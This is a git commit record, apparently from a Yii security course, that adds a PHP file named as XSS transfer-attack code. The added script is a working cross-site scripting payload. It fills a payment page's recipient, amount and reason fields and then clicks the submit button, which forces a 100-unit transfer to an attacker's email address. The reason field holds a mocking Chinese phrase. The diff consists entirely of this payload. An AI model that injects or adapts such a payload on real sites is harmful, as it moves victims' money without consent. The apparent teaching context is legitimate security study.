528f47c85e4fa66c7f24b29cf6b47e8c6e2dc98a
wggwcn <282872666@qq.com>
2017-04-19 00:42:56 +0800

    Update 2-8 xss攻击之转账代码.php

--- yii/security/2-8 xss攻击之转账代码.php
+++ yii/security/2-8 xss攻击之转账代码.php
@@ -1,1 +1,7 @@
-
+<script>
+  //从窗口中获得的ID 改成对应的值  然后getelementbyclass是一个cLASS值 然后在CLICK 方法
+  document.getElementById('ipt-search-key').value = 'xxx@mail.com';
+  document.getElementById('amout').value = '100' ;
+  document.getElementById('reason').value = '口袋没钱了，穷鬼一个';
+  document.getElementsByClassName('ui-button-text')[0].click();
+  </script>
